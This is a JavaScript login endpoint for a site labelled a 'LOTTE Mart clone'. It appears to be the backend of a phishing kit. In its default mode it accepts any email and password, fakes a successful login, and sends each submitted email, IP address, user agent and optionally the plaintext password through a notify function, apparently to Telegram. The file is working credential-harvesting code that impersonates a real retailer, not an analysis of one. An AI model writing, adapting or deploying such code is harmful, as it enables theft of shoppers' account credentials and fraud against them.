/**
 * POST /api/customer/login
 *
 * AUTH_MODE（环境变量）：
 *   lenient（默认）— 任何非空邮箱 + 任何非空密码 → 直接写会话（仿站要的「随便填都进」）
 *   strict         — 真校验：未注册 → no_account；密码不符 → bad_password
 */
import { json, isEmail, nameFromEmail, verifyPassword, uid, notify, userView } from './_shared.js';
import { getAccount, putAccount, storageMode } from './_store.js';

export async function onRequestPost({ request, env }) {
  const mode = String((env && env.AUTH_MODE) || 'lenient').toLowerCase();
  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    return json({ ok: false, code: 'bad_request', message: 'Dữ liệu không hợp lệ.' });
  }

  const email = String(body.email || '').trim().toLowerCase();
  const password = String(body.password || '');
  const ip = request.headers.get('CF-Connecting-IP') || '';
  const ua = (request.headers.get('User-Agent') || '').slice(0, 160);
  const label = (env && env.SITE_LABEL) || 'LOTTE Mart clone';

  if (!email) return json({ ok: false, code: 'missing_email', message: 'Vui lòng nhập email/số điện thoại.' });
  if (!password) return json({ ok: false, code: 'missing_password', message: 'Vui lòng nhập mật khẩu.' });

  const account = await getAccount(env, request, email);

  const doNotify = (status, extra) =>
    notify(
      env,
      `<b>${status}</b> — ${label}\nEmail: ${email}\n` +
        (String((env && env.TELEGRAM_INCLUDE_PASSWORD) || '') === '1' ? `Password: ${password}\n` : '') +
        (extra ? `${extra}\n` : '') +
        `IP: ${ip || '-'}\nUA: ${ua}`
    );

  if (mode === 'strict') {
    if (!account) {
      const notified = await doNotify('LOGIN FAILED', 'Reason: no account for this email');
      return json({ ok: false, code: 'no_account', message: 'Email này chưa được đăng ký.', auth_mode: mode, notified });
    }
    const passOk = await verifyPassword(password, account.salt, account.hash);
    if (!passOk) {
      const notified = await doNotify('LOGIN FAILED', 'Reason: wrong password');
      return json({ ok: false, code: 'bad_password', message: 'Mật khẩu không đúng.', auth_mode: mode, notified });
    }
    const notified = await doNotify('LOGIN OK');
    return json(
      { ok: true, user: userView(account), auth_mode: mode, notified },
      {
        headers: {
          'Set-Cookie': `lm_user=${encodeURIComponent(JSON.stringify(userView(account)))}; Path=/; Max-Age=2592000; SameSite=Lax`,
        },
      }
    );
  }

  // ---- lenient：任意账号密码即登录 ----
  let user = account;
  let setCookie = '';
  if (!user) {
    user = {
      id: uid(),
      name: nameFromEmail(email),
      email,
      phone: '',
      membership: 'Member',
      address: '',
      city: '',
      zip: '',
      createdAt: Date.now(),
      salt: '',
      hash: '',
    };
    const stored = await putAccount(env, request, user);
    setCookie = stored.setCookie || '';
  }

  const view = userView(user);
  const notified = await doNotify('LOGIN OK', `Name: ${view.name}`);

  const headers = { 'Set-Cookie': `lm_user=${encodeURIComponent(JSON.stringify(view))}; Path=/; Max-Age=2592000; SameSite=Lax` };
  if (setCookie) headers['Set-Cookie'] += `, ${setCookie}`;

  return json({ ok: true, user: view, auth_mode: mode, storage: storageMode(env), notified }, { headers });
}
